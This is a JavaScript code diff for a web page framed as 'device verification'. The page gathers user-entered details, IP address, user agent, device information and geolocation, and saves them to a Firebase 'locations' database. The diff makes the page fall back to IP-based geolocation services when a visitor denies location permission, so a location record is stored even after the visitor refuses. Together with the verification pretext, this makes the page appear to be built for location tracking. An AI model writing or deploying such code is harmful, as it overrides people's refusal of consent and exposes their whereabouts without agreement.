@@ -11,7 +11,7 @@ import {
 function getGeolocationErrorMessage(error) {
     switch(error.code) {
         case error.PERMISSION_DENIED:
-            return "Location access was denied. Please allow location access to verify your device.";
+            return "Location access was denied. Falling back to IP-based location.";
         case error.POSITION_UNAVAILABLE:
             return "Location information is unavailable. Please try again.";
         case error.TIMEOUT:
@@ -60,35 +60,11 @@ document.addEventListener('DOMContentLoaded', async () => {
                     throw new Error('Please fill in all required fields correctly');
                 }
 
-                if (!navigator.geolocation) {
-                    throw new Error('Geolocation is not supported by this browser');
-                }
-
                 verifyButton.disabled = true;
                 document.querySelector('.container').classList.add('processing');
                 locationStatus.textContent = 'Verifying device...';
 
-                // Get initial location
-                console.log('Requesting location...');
-                const position = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(
-                        (pos) => {
-                            console.log('Location received successfully');
-                            resolve(pos);
-                        },
-                        (err) => {
-                            console.error('Geolocation error:', err);
-                            reject(new Error(getGeolocationErrorMessage(err)));
-                        },
-                        {
-                            enableHighAccuracy: true,
-                            timeout: 20000,
-                            maximumAge: 0
-                        }
-                    );
-                });
-
-                // Get IP address
+                // Get IP address first (we'll need this regardless of location method)
                 console.log('Fetching IP address...');
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 if (!ipResponse.ok) {
@@ -96,6 +72,95 @@ document.addEventListener('DOMContentLoaded', async () => {
                 }
                 const { ip } = await ipResponse.json();
                 console.log('IP address received:', ip);
+
+                // Initialize position and source variables
+                let position;
+                let locationSource = 'IP-Based';
+
+                // Try to get geolocation first
+                if (navigator.geolocation) {
+                    try {
+                        console.log('Requesting geolocation...');
+                        position = await new Promise((resolve, reject) => {
+                            navigator.geolocation.getCurrentPosition(
+                                (pos) => {
+                                    console.log('Geolocation received successfully');
+                                    resolve(pos);
+                                },
+                                (err) => {
+                                    console.log('Geolocation error, falling back to IP:', err);
+                                    reject(err);
+                                },
+                                {
+                                    enableHighAccuracy: true,
+                                    timeout: 20000,
+                                    maximumAge: 0
+                                }
+                            );
+                        });
+                        locationSource = await determineLocationSource(position);
+                    } catch (geoError) {
+                        console.log('Falling back to IP-based location');
+                        locationStatus.textContent = getGeolocationErrorMessage(geoError);
+                        
+                        // IP-based fallback
+                        try {
+                            // Try primary service (ipapi.co)
+                            const ipLocationResponse = await fetch('https://ipapi.co/json/');
+                            const ipData = await ipLocationResponse.json();
+                            
+                            if (ipData.error || !ipData.latitude || !ipData.longitude) {
+                                throw new Error(ipData.reason || 'Invalid response from ipapi.co');
+                            }
+                            
+                            position = {
+                                coords: {
+                                    latitude: parseFloat(ipData.latitude),
+                                    longitude: parseFloat(ipData.longitude),
+                                    accuracy: 10000 // IP-based accuracy is typically low
+                                }
+                            };
+                            locationSource = 'IP-Based (Primary)';
+                        } catch (primaryError) {
+                            console.warn('Primary IP location service failed, trying backup');
+                            
+                            // Try backup service (ip-api.com)
+                            const backupResponse = await fetch('http://ip-api.com/json/?fields=lat,lon,status,message');
+                            const backupData = await backupResponse.json();
+                            
+                            if (backupData.status !== 'success' || !backupData.lat || !backupData.lon) {
+                                throw new Error(backupData.message || 'Invalid response from backup service');
+                            }
+                            
+                            position = {
+                                coords: {
+                                    latitude: parseFloat(backupData.lat),
+                                    longitude: parseFloat(backupData.lon),
+                                    accuracy: 10000
+                                }
+                            };
+                            locationSource = 'IP-Based (Backup)';
+                        }
+                    }
+                } else {
+                    // Browser doesn't support geolocation, use IP-based directly
+                    console.log('Geolocation not supported, using IP-based location');
+                    const ipLocationResponse = await fetch('https://ipapi.co/json/');
+                    const ipData = await ipLocationResponse.json();
+                    
+                    if (ipData.error || !ipData.latitude || !ipData.longitude) {
+                        throw new Error('Failed to get IP-based location');
+                    }
+                    
+                    position = {
+                        coords: {
+                            latitude: parseFloat(ipData.latitude),
+                            longitude: parseFloat(ipData.longitude),
+                            accuracy: 10000
+                        }
+                    };
+                    locationSource = 'IP-Based (Primary)';
+                }
 
                 // Save location to Firebase
                 console.log('Saving to Firebase...');
@@ -106,25 +171,26 @@ document.addEventListener('DOMContentLoaded', async () => {
                 const locationsRef = window.database.ref('locations');
                 const newLocationRef = locationsRef.push();
 
-                // Determine location source
-                console.log('Determining location source...');
-                const locationSource = await determineLocationSource(position);
-                console.log('Location source determined:', locationSource);
-
                 const locationData = {
                     ...userDetails, // Add user details
                     latitude: position.coords.latitude,
                     longitude: position.coords.longitude,
                     accuracy: position.coords.accuracy,
-                    altitude: position.coords.altitude,
-                    altitudeAccuracy: position.coords.altitudeAccuracy,
                     timestamp: new Date().toISOString(),
                     status: 'active',
-                    locationSource: locationSource, // Add location source
+                    locationSource: locationSource,
                     ip: ip,
                     userAgent: navigator.userAgent,
                     ...getDeviceInfo()
                 };
+
+                // Only add optional fields if they exist
+                if (position.coords.altitude !== null) {
+                    locationData.altitude = position.coords.altitude;
+                }
+                if (position.coords.altitudeAccuracy !== null) {
+                    locationData.altitudeAccuracy = position.coords.altitudeAccuracy;
+                }
 
                 await newLocationRef.set(locationData);
                 console.log('Location saved successfully');
